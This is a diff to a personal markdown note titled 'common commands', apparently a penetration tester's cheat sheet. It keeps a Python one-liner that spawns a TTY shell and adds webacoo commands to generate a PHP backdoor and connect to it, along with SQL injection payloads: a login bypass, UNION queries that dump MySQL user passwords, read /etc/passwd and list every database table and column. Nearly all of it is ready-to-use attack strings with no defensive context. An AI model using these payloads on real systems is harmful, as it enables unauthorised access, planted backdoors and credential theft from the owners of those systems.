@@ -1,5 +1,5 @@
 createdAt: "2018-01-19T12:11:08.345Z"
-updatedAt: "2018-01-19T12:11:17.373Z"
+updatedAt: "2018-01-23T11:34:37.514Z"
 type: "MARKDOWN_NOTE"
 folder: "d5841d5890db3062d38d"
 title: "common commands"
@@ -7,6 +7,19 @@ content: '''
   # common commands
   #### spawn TTY shell
   `python -c 'import pty; pty.spawn("/bin/sh")'`
+  
+  #### webacooo to generate php backdoor
+  `webacoo -g -o backdoor.php`
+  `webacoo -t -u http://192.168.1.102/backdoor.php` : connect to the backdoor
+  
+  ---
+  ## SQL injection commands
+  - `1' or '1'='1`: easy one
+  - `' UNION ALL SELECT 1,2,user,password FROM mysql.user#`: list all users and passwords of mysql users
+  - `' UNION ALL SELECT 1,2,3,load_file('/etc/passwd')#`: load passwd file
+  - `' UNION ALL SELECT 1,table_schema,table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'#`: dump all mysql db
+  
+  **NOTE**: the number of select entries depends on the query before the union.
 '''
 tags: []
 isStarred: false
